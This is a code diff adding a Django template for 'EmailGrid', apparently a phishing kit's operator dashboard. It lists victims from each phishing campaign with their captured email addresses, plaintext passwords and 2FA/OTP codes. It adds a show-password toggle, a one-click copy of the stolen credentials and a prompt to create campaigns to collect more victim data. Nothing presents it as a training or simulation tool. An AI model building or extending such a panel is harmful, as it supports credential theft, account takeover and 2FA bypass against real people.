@@ -1,0 +1,263 @@
+{% extends 'base.html' %}
+{% load static %}
+{% block title %}Victim Information - EmailGrid{% endblock %}
+
+{% block content %}
+<div class="py-4" style="background-color: #f8f9fa;">
+    <div class="container">
+        <!-- Header -->
+        <div class="row mb-4">
+            <div class="col-12">
+                <div class="card">
+                    <div class="card-body">
+                        <div class="d-flex justify-content-between align-items-center">
+                            <div>
+                                <h5 class="card-title mb-1">Victim Information</h5>
+                                <p class="text-muted small mb-0">Collected data from phishing campaigns</p>
+                            </div>
+                            <a href="{% url 'core:campaign_list' %}" class="btn btn-primary">
+                                <i class="bi bi-arrow-left me-2"></i>Back to Campaigns
+                            </a>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Search Bar -->
+        <div class="row mb-4">
+            <div class="col-12">
+                <div class="card">
+                    <div class="card-body">
+                        <div class="row g-2">
+                            <div class="col-md-8">
+                                <div class="input-group">
+                                    <span class="input-group-text">
+                                        <i class="bi bi-search"></i>
+                                    </span>
+                                    <input type="text" id="searchInput" class="form-control" placeholder="Search for victim data...">
+                                </div>
+                            </div>
+                            <div class="col-md-4 text-end d-flex align-items-center">
+                                <span class="text-muted ms-auto">Total victims: <span class="fw-bold">{{ total_victims|default:0 }}</span></span>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Campaign Cards -->
+        {% if campaigns %}
+            <div class="row g-4">
+                {% for campaign in campaigns %}
+                <div class="col-12 campaign-card" data-campaign-id="{{ campaign.id }}">
+                    <div class="card mb-4">
+                        <!-- Campaign Header -->
+                        <div class="card-header">
+                            <div class="row align-items-center">
+                                <div class="col-md-8">
+                                    <h6 class="mb-0">{{ campaign.email_template.get_type_display }}</h6>
+                                    <small class="text-muted">{{ campaign.recipient_email }}</small>
+                                </div>
+                                <div class="col-md-4 text-md-end">
+                                    <span class="badge bg-secondary">{{ campaign.victims_sorted|length }} victim{{ campaign.victims_sorted|length|pluralize }}</span>
+                                    <small class="text-muted ms-2">{{ campaign.created_at|date:"M d, Y" }}</small>
+                                </div>
+                            </div>
+                        </div>
+                        
+                        <!-- Victim Data -->
+                        <div class="card-body p-0">
+                            {% if campaign.victims_sorted %}
+                                <div class="table-responsive">
+                                    <table class="table table-hover table-striped mb-0">
+                                        <thead>
+                                            <tr>
+                                                <th class="border-0" width="5%">#</th>
+                                                <th class="border-0" width="25%">Email</th>
+                                                <th class="border-0" width="25%">Password</th>
+                                                <th class="border-0" width="15%">2FA/OTP</th>
+                                                <th class="border-0" width="20%">Date Captured</th>
+                                                <th class="border-0" width="10%">Actions</th>
+                                            </tr>
+                                        </thead>
+                                        <tbody>
+                                            {% for victim in campaign.victims_sorted %}
+                                            <tr class="victim-row" data-victim-id="{{ victim.id }}">
+                                                <td>
+                                                    <span class="badge bg-light text-dark">{{ forloop.counter }}</span>
+                                                </td>
+                                                <td>
+                                                    <div class="text-break">{{ victim.login_email|default:"—" }}</div>
+                                                </td>
+                                                <td>
+                                                    <div class="d-flex align-items-center">
+                                                        <div class="password-container">
+                                                            <span class="password-hidden">
+                                                                {% if victim.login_password %}•••••••••••{% else %}—{% endif %}
+                                                            </span>
+                                                            <span class="password-visible d-none">
+                                                                {{ victim.login_password|default:"—" }}
+                                                            </span>
+                                                        </div>
+                                                        {% if victim.login_password %}
+                                                            <button class="btn btn-sm btn-outline-secondary ms-2 toggle-password" type="button" title="Show/hide password">
+                                                                <i class="bi bi-eye"></i>
+                                                            </button>
+                                                        {% endif %}
+                                                    </div>
+                                                </td>
+                                                <td>
+                                                    {% if victim.login_otp %}
+                                                        <span class="badge bg-success">{{ victim.login_otp }}</span>
+                                                    {% else %}
+                                                        <span class="text-muted">—</span>
+                                                    {% endif %}
+                                                </td>
+                                                <td>
+                                                    <div>{{ victim.created_at|date:"M d, Y" }}</div>
+                                                    <small class="text-muted">{{ victim.created_at|time:"H:i" }}</small>
+                                                </td>
+                                                <td>
+                                                    <button class="btn btn-sm btn-primary" onclick="copyToClipboard('{{ victim.login_email }}', '{{ victim.login_password }}', '{{ victim.login_otp }}')" title="Copy data">
+                                                        <i class="bi bi-clipboard"></i>
+                                                    </button>
+                                                </td>
+                                            </tr>
+                                            {% endfor %}
+                                        </tbody>
+                                    </table>
+                                </div>
+                            {% else %}
+                                <div class="text-center py-4">
+                                    <i class="bi bi-inbox mb-2 text-muted" style="font-size: 1.5rem;"></i>
+                                    <p class="text-muted mb-0">No victim data collected for this campaign yet</p>
+                                </div>
+                            {% endif %}
+                        </div>
+                        
+                        <!-- Campaign Footer -->
+                        <div class="card-footer text-muted">
+                            <small>Campaign created {{ campaign.created_at|timesince }} ago</small>
+                        </div>
+                    </div>
+                </div>
+                {% endfor %}
+            </div>
+        {% else %}
+            <!-- Empty State -->
+            <div class="row">
+                <div class="col-12">
+                    <div class="card text-center">
+                        <div class="card-body py-5">
+                            <i class="bi bi-inbox mb-3 text-muted" style="font-size: 2rem;"></i>
+                            <h5 class="card-title mb-3">No Campaign Data Available</h5>
+                            <p class="card-text text-muted mb-4">Create campaigns to start collecting victim information.</p>
+                            <a href="{% url 'core:create_campaign' %}" class="btn btn-primary">
+                                <i class="bi bi-plus-circle me-2"></i>Create Campaign
+                            </a>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        {% endif %}
+    </div>
+</div>
+
+<!-- Toast notification -->
+<div class="position-fixed bottom-0 end-0 p-3">
+    <div id="copyToast" class="toast" role="alert" aria-live="assertive" aria-atomic="true">
+        <div class="toast-header">
+            <i class="bi bi-check-circle-fill text-success me-2"></i>
+            <strong class="me-auto">Success</strong>
+            <button type="button" class="btn-close" data-bs-dismiss="toast" aria-label="Close"></button>
+        </div>
+        <div class="toast-body">
+            Data copied to clipboard!
+        </div>
+    </div>
+</div>
+
+<style>
+    .password-container {
+        min-width: 100px;
+        font-family: monospace;
+    }
+    
+    .table th {
+        background-color: #f8f9fa;
+        font-weight: 600;
+    }
+    
+    .badge {
+        font-weight: 500;
+    }
+    
+    .table td {
+        vertical-align: middle;
+    }
+    
+    /* Make form controls more modern */
+    .form-control, .btn {
+        border-radius: 8px;
+    }
+    
+    .btn-outline-primary:hover, .btn-outline-dark:hover {
+        box-shadow: 0 4px 10px rgba(0,0,0,0.1);
+    }
+    
+    /* Responsive adjustments */
+    @media (max-width: 992px) {
+        .victim-item .row > div:not(:first-child) {
+            margin-top: 8px;
+        }
+    }
+</style>
+
+<script>
+    // Toggle password visibility
+    document.querySelectorAll('.toggle-password').forEach(button => {
+        button.addEventListener('click', function() {
+            const row = this.closest('tr');
+            const container = row.querySelector('.password-container');
+            const hidden = container.querySelector('.password-hidden');
+            const visible = container.querySelector('.password-visible');
+            const icon = this.querySelector('i');
+            
+            if (hidden.classList.contains('d-none')) {
+                hidden.classList.remove('d-none');
+                visible.classList.add('d-none');
+                icon.classList.remove('bi-eye-slash');
+                icon.classList.add('bi-eye');
+            } else {
+                hidden.classList.add('d-none');
+                visible.classList.remove('d-none');
+                icon.classList.remove('bi-eye');
+                icon.classList.add('bi-eye-slash');
+            }
+        });
+    });
+    
+    // Copy to clipboard function
+    function copyToClipboard(email, password, otp) {
+        const data = `Email: ${email || 'Not captured'}\nPassword: ${password || 'Not captured'}\nOTP: ${otp || 'Not captured'}`;
+        navigator.clipboard.writeText(data).then(() => {
+            const toast = new bootstrap.Toast(document.getElementById('copyToast'));
+            toast.show();
+        }).catch(err => {
+            console.error('Failed to copy: ', err);
+        });
+    }
+    
+    // Search functionality
+    document.getElementById('searchInput').addEventListener('input', function() {
+        const searchTerm = this.value.toLowerCase();
+        document.querySelectorAll('.victim-row').forEach(row => {
+            const text = row.textContent.toLowerCase();
+            row.style.display = text.includes(searchTerm) ? '' : 'none';
+        });
+    });
+</script>
+
+{% endblock %}
